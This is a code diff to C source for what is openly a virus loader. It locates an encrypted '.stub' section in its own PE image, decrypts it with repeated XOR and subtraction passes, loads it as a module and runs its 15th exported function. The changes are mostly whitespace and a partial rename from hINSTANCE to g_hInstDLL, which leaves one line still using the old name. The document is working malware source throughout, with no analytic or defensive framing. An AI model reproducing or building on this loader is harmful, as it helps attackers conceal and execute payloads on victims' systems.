@@ -27,15 +27,16 @@ void LoadSTUBSection(void)
 
 	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
 	if(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return;
-	
+
 	DecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB), pSectionSTUB[1]);// (552, 498176)
-	
+
 	if(!Setup(NULL, (PVOID)(*pSectionSTUB + (UINT32)pSectionSTUB), pSectionSTUB[1], &hVirusModule)) // (0, 552, 498176, ...)
 	{
+		// Run the 15th exported function from the loaded module
 		pVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);
 		if(pVirusExecEntry)
 			((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB, pSectionVirtualSize);
-		
+
 		FreeLibrary(hVirusModule);
 	}
 }
@@ -63,7 +64,7 @@ void DecryptSTUBSection(char *pSectionSTUB, UINT32 pSectionVirtualSize)
 			}
 			while(iFirstXOR < pSectionVirtualSize);
 		}
-		
+
 		iSecondXOR = 0;
 		if(iCyclesSecondXOR)
 		{
@@ -74,10 +75,10 @@ void DecryptSTUBSection(char *pSectionSTUB, UINT32 pSectionVirtualSize)
 			}
 			while(iSecondXOR < iCyclesSecondXOR);
 		}
-		
+
 		for(i = pSectionVirtualSize - 1; i >= 1; --i)
 			pSectionSTUB[i] -= pSectionSTUB[i - 1];
-		
+
 		--iTotalCycles;
 	}
 	while(iTotalCycles >= 0);
@@ -90,43 +91,43 @@ bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)
 	PIMAGE_SECTION_HEADER pImageSection; // edi@5
 	UINT32 *pSectionSTUB; // eax@11
 
-	if(((PIMAGE_DOS_HEADER)hINSTANCE)->e_magic != MZ_HEADER)
+	if(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER)
 		return FALSE;
-	
-	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)hINSTANCE + ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)
-	
+
+	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)g_hInstDLL + ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)
+
 	if(pImageNT->Signature != PE_HEADER)
 		return FALSE;
-	
+
 	pImageSection = (PIMAGE_SECTION_HEADER)(pImageNT->FileHeader.SizeOfOptionalHeader + (DWORD)pImageNT + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD)); // (PE header + 224 + 24)
-	
+
 	if(pImageNT->FileHeader.NumberOfSections <= 0)
 		return FALSE;
-	
+
 	int i = 0;
 	// Strcmp remains true when strs don't match
 	while(lstrcmpiA((LPCSTR)pImageSection->Name, ".stub"))
 	{
-		i++;		
-		if(i >= pImageNT->FileHeader.NumberOfSections) 
+		i++;
+		if(i >= pImageNT->FileHeader.NumberOfSections)
 			return false;
 
 		pImageSection++; // Next section
 	}
-		
+
 	if(pImageSection->SizeOfRawData < STUB_HEADER_LEN)
 		return FALSE;
-	
-	pSectionSTUB = (UINT32 *)((UINT32)hINSTANCE + pImageSection->VirtualAddress);
+
+	pSectionSTUB = (UINT32 *)((UINT32)g_hInstDLL + pImageSection->VirtualAddress);
 	if(*pSectionSTUB != STUB_INTEGRITY_MARK)
 		return FALSE;
-	
-	/* 
+
+	/*
 	* Remove the headers
 	* pSectionSTUB++ because it's an array of 4-byte values
 	*/
 	*pRawSectionSTUB     = pSectionSTUB++;
 	*pSectionVirtualSize = pImageSection->SizeOfRawData - 0x4; // Size - header
-	
+
 	return TRUE;
 }
